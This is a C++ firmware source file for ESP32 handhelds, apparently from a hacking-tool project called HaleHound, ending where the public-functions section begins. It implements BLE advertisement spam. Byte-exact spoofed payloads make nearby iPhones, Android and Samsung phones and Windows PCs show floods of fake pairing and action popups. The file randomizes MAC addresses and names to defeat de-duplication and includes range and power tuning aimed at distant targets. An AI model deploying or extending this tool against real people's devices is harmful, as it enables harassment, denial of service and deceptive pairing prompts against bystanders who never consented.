// ═══════════════════════════════════════════════════════════════════════════
// HaleHound BLE Spoofer — implementation
// Created: 2026-09-21 (Cardputer ADV port — on-chip BLE attacks)
// Shared unchanged with the T-Embed CC1101 build since 2026-09-22 — see
// ble_spoofer.h for why this file needed no board branch to port.
// See ble_spoofer.h for the full port/fidelity writeup. Structurally this is
// ble_jammer.cpp's worker-task/Cmd-queue shape wrapped around
// bluetooth_attacks.cpp's BleSpoofer::doBroadcast() broadcast core and
// device-signature tables, ported verbatim; BLE lifecycle (WiFi off, Classic
// BT memory release, BLEDevice::init/deinit) follows lunatic_fringe.cpp's
// worker exactly since both are on-chip-BLE features on both boards.
// ═══════════════════════════════════════════════════════════════════════════

#include "ble_spoofer.h"
#include <Arduino.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_random.h>
#include <esp_system.h>  // esp_get_free_heap_size() — heap-safety check in the worker loop
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

// ═══════════════════════════════════════════════════════════════════════════
// SPAM MODES — ported from BleSpoofer::SpamMode
// ═══════════════════════════════════════════════════════════════════════════

enum SpamMode {
    MODE_APPLE_POPUP = 0,
    MODE_SOUR_APPLE,
    MODE_FAST_PAIR,
    MODE_SAMSUNG_BUDS,
    MODE_SAMSUNG_WATCH,
    MODE_SWIFT_PAIR,
    MODE_FLIPPER_ZERO,
    MODE_CHAOS,
    MODE_COUNT  // 8
};

static const char* MODE_NAMES[] = {
    "APPLE POPUP",
    "SOUR APPLE",
    "FAST PAIR",
    "SAMSUNG BUDS",
    "SAMSUNG WATCH",
    "SWIFT PAIR",
    "FLIPPER ZERO",
    "CHAOS"
};

// ═══════════════════════════════════════════════════════════════════════════
// MARAUDER PARITY (2026-10-06): the five payloads that have a direct ESP32
// Marauder equivalent — Apple device popup, Apple Nearby Action ("Sour
// Apple"), Google Fast Pair, Samsung Watch and Microsoft Swift Pair — are
// now byte-for-byte identical to Marauder's GetUniversalAdvertisementData()
// (justcallmekoko/ESP32Marauder, esp32_marauder/WiFiScan.cpp). Three things
// changed vs the previous port and are why spam (esp. Swift Pair) now
// triggers reliably and at range:
//   1. No Flags AD (02 01 06) prefix — Marauder omits it on every type; the
//      old port prepended it, wasting 3 of the 31 payload bytes and diverging
//      from the exact beacon layout phones/Windows expect.
//   2. Swift Pair uses a RANDOM device name per packet (makeRandomName())
//      instead of a 10-name fixed list — fixed names get de-duplicated after
//      the first Windows toast, so sustained spam stopped showing anything.
//   3. Correct Nearby Action flag 0xC0 (old port used 0xC1) and Marauder's
//      exact model/type tables.
// Samsung Buds below has no Marauder equivalent and is kept as a HaleHound
// extra (Galaxy EasySetup), unchanged.
// ═══════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════
// APPLE POPUP - Proximity Pairing (Type 0x07, "Devices") — Marauder exact.
// Triggers "Your [Device]" connect card on iPhones/iPads. 16-bit model codes
// (high byte = status 0x20, except 0x0055), big-endian into the packet.
// ═══════════════════════════════════════════════════════════════════════════

#define APPLE_COUNT 15

static const uint16_t APPLE_MODELS[APPLE_COUNT] = {
    0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20,
    0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620
};

static const char* APPLE_NAMES[APPLE_COUNT] = {
    "AirPods", "AirPods Gen2", "AirPods Gen3", "AirPods Pro2", "AirPods Pro",
    "AirPods Max", "Apple Dev", "Solo Pro", "Studio Buds", "BeatsX",
    "Beats Flex", "Beats Studio3", "Studio Pro", "Beats FitPro", "Studio Buds+"
};

// ═══════════════════════════════════════════════════════════════════════════
// SOUR APPLE - Nearby Action (Type 0x0F) — Marauder exact (flag 0xC0).
// Floods iOS with random action modals (WiFi, AirDrop, setup, etc.)
// ═══════════════════════════════════════════════════════════════════════════

#define SOUR_APPLE_COUNT 9

static const uint8_t SOUR_APPLE_TYPES[SOUR_APPLE_COUNT] = {
    0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20
};

static const char* SOUR_APPLE_NAMES[SOUR_APPLE_COUNT] = {
    "Setup Dev", "Transfer #", "AirPlay", "Handoff", "WiFi Pass",
    "HomePod", "New iPhone", "AirDrop", "Nearby"
};

// ═══════════════════════════════════════════════════════════════════════════
// GOOGLE FAST PAIR (Service UUID 0xFE2C) — Marauder exact.
// Fixed "Smart Controller" model ID 0x27B700 + a random TX-power byte each
// packet (freshness comes from the rotating MAC, like Marauder). Single
// logical device, so no model table.
// ═══════════════════════════════════════════════════════════════════════════

#define FAST_PAIR_COUNT 1

static const char* FAST_PAIR_NAMES[FAST_PAIR_COUNT] = {
    "Fast Pair"
};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG BUDS (Company ID 0x0075)
// Triggers Samsung EasySetup pairing popup on Galaxy phones
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_BUDS_COUNT 20

static const uint8_t SAMSUNG_BUDS_IDS[SAMSUNG_BUDS_COUNT][3] = {
    {0xEE, 0x7A, 0x01}, {0x9B, 0x7A, 0x01}, {0x9B, 0x7A, 0x02}, {0x4E, 0x85, 0x01},
    {0x4E, 0x85, 0x02}, {0x4E, 0x85, 0x03}, {0xA7, 0x2F, 0x01}, {0xA7, 0x2F, 0x02},
    {0xA7, 0x2F, 0x03}, {0x74, 0x87, 0x01}, {0x74, 0x87, 0x02}, {0x74, 0x87, 0x03},
    {0xAE, 0x59, 0x01}, {0xAE, 0x59, 0x02}, {0xAE, 0x59, 0x03}, {0x53, 0xD4, 0x01},
    {0x53, 0xD4, 0x02}, {0xB6, 0xC4, 0x01}, {0xB6, 0xC4, 0x02}, {0x11, 0xA0, 0x01}
};

static const char* SAMSUNG_BUDS_NAMES[SAMSUNG_BUDS_COUNT] = {
    "Galaxy Buds", "Galaxy Buds+", "Buds+ Black", "Buds Live", "Buds Live B",
    "Buds Live W", "Buds Pro", "Buds Pro S", "Buds Pro V", "Buds2",
    "Buds2 White", "Buds2 Purple", "Buds2 Pro", "Buds2 Pro W", "Buds2 Pro G",
    "Buds FE", "Buds FE W", "Buds3", "Buds3 Pro", "Buds+ Rose"
};

// Samsung Buds fixed header and tail bytes for EasySetup protocol
static const uint8_t SAMSUNG_BUDS_HDR[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
static const uint8_t SAMSUNG_BUDS_TAIL[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG WATCH (Company ID 0x0075)
// Triggers Samsung Watch pairing popup on Galaxy phones
// ═══════════════════════════════════════════════════════════════════════════

// Marauder exact: watch_models[] value bytes (first entry 0x1A is Marauder's
// "Fallback Watch"). The high byte of the model is always 0x00 here.
#define SAMSUNG_WATCH_COUNT 17

static const uint8_t SAMSUNG_WATCH_IDS[SAMSUNG_WATCH_COUNT] = {
    0x1A, 0x02, 0x03, 0x06, 0x07, 0x08, 0x09, 0x0B, 0x0C,
    0x11, 0x12, 0x14, 0x16, 0x17, 0x1C, 0x1D, 0x20
};

static const char* SAMSUNG_WATCH_NAMES[SAMSUNG_WATCH_COUNT] = {
    "Fallback", "Watch4C 40B", "Watch4C 40W", "Watch4 44", "Watch4 40B",
    "Watch4 40W", "Watch4 40G", "Watch4C Fr", "Watch5 44", "Watch5 44B",
    "Watch5 44S", "Watch5 40G", "Watch5Pro45", "Watch5 44W", "Watch6 40G",
    "Watch6 44C", "Watch6C 43G"
};

// Samsung Watch fixed header for pairing protocol (matches Marauder's inline
// 0x01 0x00 0x02 0x00 0x01 0x01 0xFF 0x00 0x00 0x43 bytes exactly).
static const uint8_t SAMSUNG_WATCH_HDR[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};

// ═══════════════════════════════════════════════════════════════════════════
// MICROSOFT SWIFT PAIR (Company ID 0x0006) — Marauder exact.
// Triggers "New Bluetooth device found" on Windows 10/11. The display name is
// randomized per packet (makeRandomName), so a single logical device here —
// no fixed name table.
// ═══════════════════════════════════════════════════════════════════════════

#define SWIFT_PAIR_COUNT 1

static const char* SWIFT_PAIR_NAMES[SWIFT_PAIR_COUNT] = {
    "Swift Pair"
};

// ═══════════════════════════════════════════════════════════════════════════
// FLIPPER ZERO (Manufacturer ID 0x0FBA) — Marauder exact.
// Broadcasts advertisements that impersonate a Flipper Zero, so a flood of
// fake Flippers appears in any BLE scanner (nRF Connect, a phone's device
// list, another Marauder). NOTE: this does NOT pop up on a stock Flipper Zero
// itself — stock firmware doesn't scan-and-alert on nearby adverts; it only
// shows up where something is actively scanning BLE. Randomized 5-char name
// per packet (makeRandomName) so each looks like a distinct Flipper.
// ═══════════════════════════════════════════════════════════════════════════

#define FLIPPER_COUNT 1

static const char* FLIPPER_NAMES[FLIPPER_COUNT] = {
    "Flipper Zero"
};

// Device counts per mode (CHAOS uses all, so 0 here — never indexed directly)
static const int MODE_DEVICE_COUNTS[] = {
    APPLE_COUNT, SOUR_APPLE_COUNT, FAST_PAIR_COUNT, SAMSUNG_BUDS_COUNT,
    SAMSUNG_WATCH_COUNT, SWIFT_PAIR_COUNT, FLIPPER_COUNT, 0
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════════════════════

// Persists across Stop()/Start() within a session, same as
// ble_jammer.cpp's s_modeIndex.
static volatile int s_currentMode = MODE_APPLE_POPUP;
static int s_deviceIndex[MODE_COUNT] = {0};
static int s_chaosStep = 0;

// Set false at each worker start; flipped true once doBroadcast() has
// re-asserted +9dBm ADV power after advertising is actually live (see the
// POWER fix note in doBroadcast()). Prevents re-issuing the power call on
// every single burst while still guaranteeing it lands once post-start.
static bool s_advPowerAsserted = false;

static volatile uint32_t s_packetCount = 0;
static volatile uint32_t s_rateWindowCount = 0;
static volatile uint16_t s_currentRate = 0;

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

#define BLE_SPOOF_STATUS_INTERVAL_MS 250

// ── Classic BT memory release — same helper shape as lunatic_fringe.cpp/
// ble_scan.cpp. Must run before BLEDevice::init() triggers
// esp_bt_controller_init(); harmless (and skipped) if already released by
// an earlier BLE feature this boot.
static bool s_classicBtReleased = false;
static void releaseClassicBtMemory() {
    if (s_classicBtReleased) return;
    esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    if (err == ESP_OK) {
        s_classicBtReleased = true;
    }
    #if CYD_DEBUG
    Serial.printf("[BLESPOOF] releaseClassicBtMemory: 0x%x, heap=%u\n", err, ESP.getFreeHeap());
    #endif
}

static int getDeviceCount(int mode) {
    if (mode < 0 || mode >= MODE_COUNT) return 0;
    return MODE_DEVICE_COUNTS[mode];
}

static const char* getDeviceName(int mode, int idx) {
    switch (mode) {
        case MODE_APPLE_POPUP:   return (idx >= 0 && idx < APPLE_COUNT) ? APPLE_NAMES[idx] : "?";
        case MODE_SOUR_APPLE:    return (idx >= 0 && idx < SOUR_APPLE_COUNT) ? SOUR_APPLE_NAMES[idx] : "?";
        case MODE_FAST_PAIR:     return (idx >= 0 && idx < FAST_PAIR_COUNT) ? FAST_PAIR_NAMES[idx] : "?";
        case MODE_SAMSUNG_BUDS:  return (idx >= 0 && idx < SAMSUNG_BUDS_COUNT) ? SAMSUNG_BUDS_NAMES[idx] : "?";
        case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
        case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
        case MODE_FLIPPER_ZERO:  return (idx >= 0 && idx < FLIPPER_COUNT) ? FLIPPER_NAMES[idx] : "?";
        case MODE_CHAOS:         return "CHAOS";
        default:                 return "?";
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS — Apple popup, Sour Apple, Fast Pair, Samsung Watch and
// Swift Pair are byte-for-byte identical to ESP32 Marauder's
// GetUniversalAdvertisementData(). Samsung Buds is a HaleHound extra.
// ═══════════════════════════════════════════════════════════════════════════

// Marauder parity: a random device name, used by Swift Pair (and available to
// any name-carrying beacon). Marauder draws from its `alfa` charset; we use
// letters + digits only (printable and safe to render in a Windows/Android
// pairing toast) with a random 3..maxLen length. A fresh name per packet
// means the target treats each spoof as a new device instead of de-duping
// it — which is what keeps Swift Pair toasts coming instead of showing once.
static const char RANDOM_NAME_CHARSET[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

static int makeRandomName(char* out, int maxLen) {
    if (maxLen < 4) maxLen = 4;
    int len = 3 + (int)random(maxLen - 2);  // 3 .. maxLen inclusive
    for (int i = 0; i < len; i++) {
        out[i] = RANDOM_NAME_CHARSET[random(sizeof(RANDOM_NAME_CHARSET) - 1)];
    }
    out[len] = '\0';
    return len;
}

// Apple Proximity Pairing — "Devices" branch (Marauder exact, 21 bytes).
// Triggers the iOS "device nearby / connect" card. No Flags AD.
static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[21];
    int i = 0;
    pkt[i++] = 0x14;  // Length (20 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc (low)
    pkt[i++] = 0x00;  // Apple Inc (high)
    pkt[i++] = 0x07;  // Proximity Pairing type
    pkt[i++] = 0x0F;  // Data length
    pkt[i++] = 0x00;  // Prefix
    uint16_t type = APPLE_MODELS[idx % APPLE_COUNT];
    pkt[i++] = (uint8_t)((type >> 8) & 0xFF);  // model high (big-endian, per Marauder)
    pkt[i++] = (uint8_t)(type & 0xFF);         // model low
    pkt[i++] = 0xAC;  // Marauder fixed status block
    pkt[i++] = 0x90;
    pkt[i++] = 0x85;
    pkt[i++] = 0x75;
    pkt[i++] = 0x94;
    pkt[i++] = 0x65;
    pkt[i++] = (uint8_t)random(256);  // 5 random bytes — unique per packet
    pkt[i++] = (uint8_t)random(256);
    pkt[i++] = (uint8_t)random(256);
    pkt[i++] = (uint8_t)random(256);
    pkt[i++] = (uint8_t)random(256);
    pkt[i++] = 0x00;
    advData.addData(std::string((char*)pkt, 21));
}

// Apple Nearby Action — "Sour Apple" (Marauder exact, 11 bytes, flag 0xC0).
static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
    uint8_t pkt[11];
    int i = 0;
    pkt[i++] = 0x0A;  // Length (10 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc (low)
    pkt[i++] = 0x00;  // Apple Inc (high)
    pkt[i++] = 0x0F;  // Nearby Action type
    pkt[i++] = 0x05;  // Length
    pkt[i++] = 0xC0;  // Action flags (Marauder uses 0xC0, not 0xC1)
    pkt[i++] = SOUR_APPLE_TYPES[typeIdx % SOUR_APPLE_COUNT];
    pkt[i++] = (uint8_t)random(256);  // 3 random auth bytes
    pkt[i++] = (uint8_t)random(256);
    pkt[i++] = (uint8_t)random(256);
    advData.addData(std::string((char*)pkt, 11));
}

// Google Fast Pair (Service UUID 0xFE2C) — Marauder exact (14 bytes).
// No Flags AD; fixed model 0x00 0xB7 0x27 + a random TX-power byte.
static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
    (void)idx;  // single logical device — freshness is the rotating MAC
    uint8_t pkt[14];
    int i = 0;
    pkt[i++] = 3;     // Service UUID list: Length
    pkt[i++] = 0x03;  // Complete 16-bit UUID list type
    pkt[i++] = 0x2C;  // FE2C (low)
    pkt[i++] = 0xFE;  // FE2C (high)
    pkt[i++] = 6;     // Service Data: Length
    pkt[i++] = 0x16;  // Service Data type
    pkt[i++] = 0x2C;  // FE2C (low)
    pkt[i++] = 0xFE;  // FE2C (high)
    pkt[i++] = 0x00;  // Model ID (Smart Controller) byte 0
    pkt[i++] = 0xB7;  // Model ID byte 1
    pkt[i++] = 0x27;  // Model ID byte 2
    pkt[i++] = 2;     // TX Power: Length
    pkt[i++] = 0x0A;  // TX Power type
    pkt[i++] = (uint8_t)((rand() % 120) - 100);  // -100..+19 dBm, per Marauder
    advData.addData(std::string((char*)pkt, 14));
}

// Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    int i = 0;
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    pkt[i++] = 0x1B;  // AD Length = 27 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    memcpy(&pkt[i], SAMSUNG_BUDS_HDR, 10);
    i += 10;
    const uint8_t* id = SAMSUNG_BUDS_IDS[idx % SAMSUNG_BUDS_COUNT];
    pkt[i++] = id[0];
    pkt[i++] = id[1];
    pkt[i++] = 0x01;  // Separator
    pkt[i++] = id[2];
    memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
    i += 10;
    advData.addData(std::string((char*)pkt, 31));
}

// Samsung Galaxy Watch (Company ID 0x0075) — Marauder exact (15 bytes).
// No Flags AD; header matches Marauder's inline bytes, model from watch IDs.
static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[15];
    int i = 0;
    pkt[i++] = 14;    // Length (14 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    memcpy(&pkt[i], SAMSUNG_WATCH_HDR, 10);
    i += 10;
    pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];  // watch model / color
    advData.addData(std::string((char*)pkt, 15));
}

// Microsoft Swift Pair (Company ID 0x0006) — Marauder exact.
// No Flags AD; randomized display name per packet so Windows shows a fresh
// "New Bluetooth device found" toast each time instead of de-duping.
static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
    (void)idx;
    char name[24];
    // Cap the name so the whole section (7 header bytes + name) stays within
    // the 31-byte legacy advertising limit.
    int nameLen = makeRandomName(name, 20);

    uint8_t pkt[31];
    int i = 0;
    pkt[i++] = (uint8_t)(7 + nameLen - 1);  // section length (Marauder: 7+name_len-1)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x06;  // Microsoft company ID (low)
    pkt[i++] = 0x00;  // Microsoft company ID (high)
    pkt[i++] = 0x03;  // Microsoft Beacon ID (Swift Pair)
    pkt[i++] = 0x00;  // Microsoft Beacon Sub-scenario (pair over LE)
    pkt[i++] = 0x80;  // Reserved RSSI byte
    memcpy(&pkt[i], name, nameLen);
    i += nameLen;
    advData.addData(std::string((char*)pkt, i));
}

// Flipper Zero impersonation (Manufacturer ID 0x0FBA) — Marauder exact.
// Replicates Marauder's byte layout verbatim, including its manufacturer
// section length byte of 0x05 (technically short for the 9 bytes that follow
// — that is what Marauder ships and what makes fake Flippers show in scanners,
// so it's kept as-is rather than "corrected"). 5-char random name per packet.
static void getFlipperPayload(BLEAdvertisementData& advData, int idx) {
    (void)idx;
    char name[6];
    for (int k = 0; k < 5; k++) {
        name[k] = RANDOM_NAME_CHARSET[random(sizeof(RANDOM_NAME_CHARSET) - 1)];
    }
    name[5] = '\0';

    uint8_t pkt[31];
    int i = 0;
    pkt[i++] = 0x02;  // Flags: length
    pkt[i++] = 0x01;  // Flags: type
    pkt[i++] = 0x06;  // Flags: LE General Discoverable + BR/EDR not supported

    pkt[i++] = 0x06;  // Complete Local Name: length (type + 5 name chars)
    pkt[i++] = 0x09;  // Complete Local Name: type
    memcpy(&pkt[i], name, 5);
    i += 5;

    pkt[i++] = 0x03;  // Incomplete 16-bit Service UUID list: length
    pkt[i++] = 0x02;  // Incomplete 16-bit Service UUID list: type
    pkt[i++] = 0x80 + (rand() % 3) + 1;  // Service UUID low (Marauder)
    pkt[i++] = 0x30;  // Service UUID high

    pkt[i++] = 0x02;  // TX Power: length
    pkt[i++] = 0x0A;  // TX Power: type
    pkt[i++] = 0x00;  // TX Power: value

    pkt[i++] = 0x05;  // Manufacturer Specific Data: length (Marauder's literal 0x05)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data: type
    pkt[i++] = 0xBA;  // Flipper Zero manufacturer ID low (0x0FBA)
    pkt[i++] = 0x0F;  // Flipper Zero manufacturer ID high
    pkt[i++] = 0x4C;  // Marauder's fixed trailing data
    pkt[i++] = 0x75;
    pkt[i++] = 0x67;
    pkt[i++] = 0x26;
    pkt[i++] = 0xE1;
    pkt[i++] = 0x80;

    advData.addData(std::string((char*)pkt, i));
}

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (bypasses Arduino wrapper for reliable BLE
// spam) — ported unchanged. ADV_TYPE_NONCONN_IND = non-connectable
// undirected (BLE spam standard). BLE_ADDR_TYPE_RANDOM = new random MAC per
// broadcast cycle. 0x20 interval = 20ms = fastest BLE spec allows.
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t s_advParams = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x20,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// Per-payload on-air dwell (RANGE fix). The controller emits one advertising
// event on all three primary channels every adv interval (20ms) for as long
// as a burst stays live, so dwelling longer per payload puts more copies of
// the SAME packet on air. That is what lets a distant or moving target —
// where most packets are lost and the phone's scan window only occasionally
// overlaps a given channel — actually catch one and raise the popup. The old
// single-shot 20ms gave each payload ~1 event/channel, which is why it only
// fired when the target was close (high RSSI, low loss). The tradeoff is
// fewer distinct MAC/payload rotations per second (the pkt/s counter drops),
// but reach is governed by repetition, not variety. 60ms ≈ 3 events/channel.
// Raise toward 100-150ms when targets are far and reach matters more than
// variety; lower toward 20ms for maximum popup freshness at close range.
#define BLE_SPOOF_ADV_DWELL_MS 60

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE — ported from BleSpoofer::doBroadcast(). Device
// selection for non-CHAOS modes is auto round-robin instead of the
// original's manually-set index (see ble_spoofer.h for why — no second
// control axis on this board).
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // Sequence: stop -> setRandAddr -> configDataRaw -> start -> delay -> stop
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type
    esp_ble_gap_set_rand_addr(addr);

    int currentMode = s_currentMode;
    int broadcastMode = currentMode;
    int broadcastIdx = 0;
    const char* deviceName = "";

    if (currentMode == MODE_CHAOS) {
        // Round-robins the 7 real platforms (everything except CHAOS itself),
        // random device within each — same shape as the original's CHAOS step.
        broadcastMode = s_chaosStep % (MODE_COUNT - 1);
        int count = getDeviceCount(broadcastMode);
        broadcastIdx = (count > 0) ? random(count) : 0;
        s_chaosStep++;
    } else {
        broadcastIdx = s_deviceIndex[currentMode];
    }

    BLEAdvertisementData advData = BLEAdvertisementData();

    switch (broadcastMode) {
        case MODE_APPLE_POPUP:
            getApplePopupPayload(advData, broadcastIdx);
            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
            break;

        case MODE_SOUR_APPLE: {
            // Original always randomizes the action type per packet
            // (doesn't use the sticky device index) — ported verbatim.
            int randType = random(SOUR_APPLE_COUNT);
            getSourApplePayload(advData, randType);
            deviceName = SOUR_APPLE_NAMES[randType];
            break;
        }

        case MODE_FAST_PAIR:
            getFastPairPayload(advData, broadcastIdx);
            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
            break;

        case MODE_SAMSUNG_BUDS:
            getSamsungBudsPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
            break;

        case MODE_SAMSUNG_WATCH:
            getSamsungWatchPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
            break;

        case MODE_SWIFT_PAIR:
            getSwiftPairPayload(advData, broadcastIdx);
            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
            break;

        case MODE_FLIPPER_ZERO:
            getFlipperPayload(advData, broadcastIdx);
            deviceName = FLIPPER_NAMES[broadcastIdx % FLIPPER_COUNT];
            break;

        default:
            return;
    }

    // Advance the round-robin device index for next broadcast (this board's
    // stand-in for the original's manual Prev/Next-device touch icons).
    if (currentMode != MODE_CHAOS) {
        int count = getDeviceCount(currentMode);
        if (count > 0) {
            s_deviceIndex[currentMode] = (s_deviceIndex[currentMode] + 1) % count;
        }
    }

    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for
    // reliable cycling)
    std::string payload = advData.getPayload();
    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());

    // Brief pause for data config to take effect
    delay(1);

    // Start advertising with raw ESP-IDF params
    esp_ble_gap_start_advertising(&s_advParams);

    // POWER fix: re-assert max ADV TX power now that an advertising instance
    // actually exists. On this IDF the ADV power level only latches onto the
    // active advertising set once advertising has started at least once;
    // setting it only pre-start (as worker init does) can leave every burst
    // at default (~0dBm) power — the main reason effective range was short.
    // Do it once per run, right after the first real start.
    if (!s_advPowerAsserted) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
        s_advPowerAsserted = true;
    }

    // Hold the burst so the controller fires repeated advertising events on
    // channels 37/38/39 for the whole dwell (RANGE fix — see
    // BLE_SPOOF_ADV_DWELL_MS). More repeats of this payload = higher odds a
    // distant/moving target's scan window catches it.
    delay(BLE_SPOOF_ADV_DWELL_MS);

    // Stop advertising (clean cycle for next random MAC)
    esp_ble_gap_stop_advertising();

    s_packetCount++;
    s_rateWindowCount++;

    // Log first 5 packets to serial for debugging, same as the original
    if (s_packetCount <= 5) {
        Serial.printf("[BLESPOOF] TX #%lu mode=%d dev=%s len=%d addr=%02X:%02X:%02X\n",
            (unsigned long)s_packetCount, broadcastMode, deviceName,
            (int)payload.length(), addr[0], addr[1], addr[2]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// WORKER TASK — core 0, Cmd-queue stop (same shape as ble_jammer.cpp/
// lunatic_fringe.cpp). Replaces the original's dual-core split (Core 0
// doBroadcast loop / Core 1 Arduino loop() for touch+display) since this
// board's orchestrator (core 1) already just polls RenderMsg telemetry.
// ═══════════════════════════════════════════════════════════════════════════

static void bleSpooferWorkerTask(void* param) {
    (void)param;

    // Kill WiFi completely — it shares the 2.4GHz radio with BLE. Arduino
    // API keeps _esp_wifi_started in sync, same as the original.
    WiFi.mode(WIFI_OFF);
    delay(200);

    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] BLE stack initialized, max TX power set");
    #endif

    // Seed Arduino's PRNG from the hardware RNG so makeRandomName() (Swift
    // Pair names) doesn't repeat the same sequence every boot.
    randomSeed(esp_random());

    s_packetCount = 0;
    s_rateWindowCount = 0;
    s_currentRate = 0;
    s_chaosStep = 0;
    s_advPowerAsserted = false;  // re-assert ADV power once per run (see doBroadcast)

    uint32_t rateStart = millis();
    uint32_t lastStatus = 0;
    bool stop = false;

    for (;;) {
        Cmd cmd;
        while (xQueueReceive(s_cmdQueue, &cmd, 0) == pdTRUE) {
            if (cmd.type == CMD_STOP) {
                stop = true;
                break;
            }
        }
        if (stop) break;

        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();

        uint32_t now = millis();
        if (now - rateStart >= 1000) {
            s_currentRate = (uint16_t)s_rateWindowCount;
            s_rateWindowCount = 0;
            rateStart = now;
        }

        if (now - lastStatus >= BLE_SPOOF_STATUS_INTERVAL_MS) {
            lastStatus = now;
            int mode = s_currentMode;
            const char* devName = (mode == MODE_CHAOS)
                ? "ALL" : getDeviceName(mode, s_deviceIndex[mode]);
            RenderMsg msg;
            msg.kind = RENDER_MSG_STATUS_TEXT;
            snprintf(msg.payload.text, RENDER_MSG_TEXT_MAX, "%s %s #%lu %dpkt/s",
                     MODE_NAMES[mode], devName, (unsigned long)s_packetCount,
                     s_currentRate);
            messagingPostTelemetry(msg);
        }

        // delay(20) inside doBroadcast() already yields; belt and suspenders
        // for the task WDT, same cadence as the original.
        vTaskDelay(1);
    }

    esp_ble_gap_stop_advertising();
    BLEDevice::deinit(false);  // false — deinit(true) never resets initialized flag (library bug)
    WiFi.mode(WIFI_STA);

    radioRelease(RADIO_BLE);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
